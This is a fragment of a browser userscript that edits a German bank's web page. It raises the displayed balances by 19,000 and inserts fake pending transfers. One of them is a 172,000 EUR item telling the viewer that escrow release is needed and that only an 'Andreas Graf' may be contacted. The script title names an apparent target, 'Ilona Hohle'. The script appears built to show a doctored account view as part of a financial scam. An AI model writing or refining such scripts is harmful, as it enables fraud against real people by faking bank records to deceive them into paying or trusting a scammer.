// ==UserScript==
// @name         ED Combined Post Ilona Hohle
...
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/487808/ED%20Combined%20Post%20Ilona%20Hohle.user.js
// @updateURL https://update.greasyfork.org/scripts/487808/ED%20Combined%20Post%20Ilona%20Hohle.meta.js
// ==/UserScript==
...
var modificationAmount = 19000.00; // Example: +9000 to increase by 9000
...
//====MAIN PAGE BALANCES===================UMSATZE BALANCE
    ...
    var MBALANCE_CONFIGS = [
        ...
        { index: 1, adjustmentAmount: 19000 },
        { index: 2, adjustmentAmount: 19000 }
    ...
    var transactionsToInsert = [
        {
            ...
            transactionInfo: 'Treuhand:Freigabe nötig. Wenden Sie sich nur an Andreas Graf.',
            transactionType: ' SEPA Überweisung ',
            transactionDate: 'Vorgemekrt',
            transactionAmount: '172.000,00 EUR',
        ...
        },
        {
           ...
           transactionAmount: '1.000,00 EUR',
            preferredInsertionLogic: 'pinned_top',
           moveSteps: 0,
            moveDirection: 'up'
        },
...
function modifyMainBalance(modificationAmount, balanceIndex) {
    ...
    // Find the third element with class="container"
    var thirdContainerElement = document.querySelectorAll('.container')[1];
    if (thirdContainerElement) {
        // Find the matching element within the third container
        var matchingElement = thirdContainerElement.querySelector('.positive.db-text-bold');
        if (matchingElement) {
            ...
            console.log('No matching element found within the third container.');
        }
    } else {
        console.log('No third container element found.');
    }
}
